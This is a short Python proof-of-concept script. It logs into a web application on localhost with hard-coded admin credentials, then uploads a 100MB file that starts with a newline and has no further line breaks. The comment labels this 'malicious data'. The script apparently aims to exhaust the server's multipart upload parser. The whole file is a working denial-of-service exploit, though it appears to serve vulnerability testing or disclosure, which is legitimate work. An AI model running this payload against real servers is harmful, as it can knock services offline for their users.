import requests

base_url = 'http://127.0.0.1:9090'

login_url = f'{base_url}/login'
file_url = f'{base_url}/file'

login_data = {
    "username": "admin1",
    "password": "adminpassword1"
}

login_response = requests.post(login_url, json=login_data)

if login_response.status_code == 200:
    print("Login successful!")
    cookies = login_response.cookies
else:
    print("Login failed!")
    exit()

# Construct malicious data, starting with CR or LF, followed by a lot of data without CR/LF
evil_content = b'\n' + b'A' * 100000000 # 100MB of 'A'
normal_content = b'A' * 100000000 # 100MB of 'A'

files = {'file': ('evil.txt', evil_content)}

response = requests.post(file_url, files=files, cookies=cookies)

print(response.text)
